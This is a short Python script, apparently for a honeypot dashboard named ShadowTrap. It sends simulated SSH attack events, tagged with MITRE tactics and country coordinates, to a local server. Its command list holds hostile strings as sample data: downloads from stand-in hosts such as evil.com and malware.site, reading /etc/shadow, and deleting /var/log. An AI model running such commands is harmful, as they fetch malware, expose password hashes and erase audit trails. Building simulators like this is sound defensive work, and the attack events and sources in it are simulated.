import requests
import time
import random

# Curated list of global IPs for simulation
GLOBAL_IPS = {
    "US": {"ips": ["1.1.1.1", "8.8.8.8"], "lat": 37.09, "lon": -95.71},
    "RU": {"ips": ["95.161.226.1", "185.158.113.2"], "lat": 61.52, "lon": 105.31},
    "CN": {"ips": ["1.2.3.4", "114.114.114.114"], "lat": 35.86, "lon": 104.19},
    "BR": {"ips": ["177.126.168.1", "200.147.67.2"], "lat": -14.23, "lon": -51.92},
    "IN": {"ips": ["103.21.64.1", "49.207.0.2"], "lat": 20.59, "lon": 78.96},
    "DE": {"ips": ["78.46.0.1", "176.9.0.2"], "lat": 51.16, "lon": 10.45},
    "JP": {"ips": ["1.0.16.1", "1.0.64.2"], "lat": 36.20, "lon": 138.25},
    "GB": {"ips": ["2.24.0.1", "2.120.0.2"], "lat": 55.37, "lon": -3.43}
}

TACTICS = ["Initial Access", "Execution", "Persistence", "Privilege Escalation", "Defense Evasion"]
COMMANDS = ["curl http://evil.com/payload", "./exploit", "crontab -l", "sudo su", "rm -rf /var/log", "cat /etc/shadow", "wget http://malware.site/miner.sh"]

def simulate():
    print("Starting ShadowTrap Global Traffic Simulation...")
    print("Press CTRL+C to stop.")
    while True:
        country_code = random.choice(list(GLOBAL_IPS.keys()))
        data = GLOBAL_IPS[country_code]
        ip = random.choice(data["ips"])
        
        # Slightly jitter the coordinates for better spread on map
        lat = data["lat"] + random.uniform(-2, 2)
        lon = data["lon"] + random.uniform(-2, 2)
        
        event = {
            "event": "SSH_SESSION",
            "ip": ip,
            "user": random.choice(["root", "admin", "webuser", "guest", "deploy"]),
            "command": random.choice(COMMANDS),
            "risk_score": random.randint(30, 99),
            "mitre_tactic": random.choice(TACTICS),
            "location": {
                "country": country_code,
                "city": "Simulated Node",
                "code": country_code,
                "lat": lat,
                "lon": lon
            },
            "patterns": []
        }
        
        try:
            requests.post("http://localhost:8000/soc/simulate", json=event)
            print(f"[+] Simulated attack from {country_code} ({ip}) - Tactic: {event['mitre_tactic']}")
        except Exception as e:
            print(f"[-] Error: Could not connect to ShadowTrap server at http://localhost:8000")
            
        time.sleep(random.uniform(0.5, 2.5))

if __name__ == "__main__":
    try:
        simulate()
    except KeyboardInterrupt:
        print("\nSimulation stopped.")
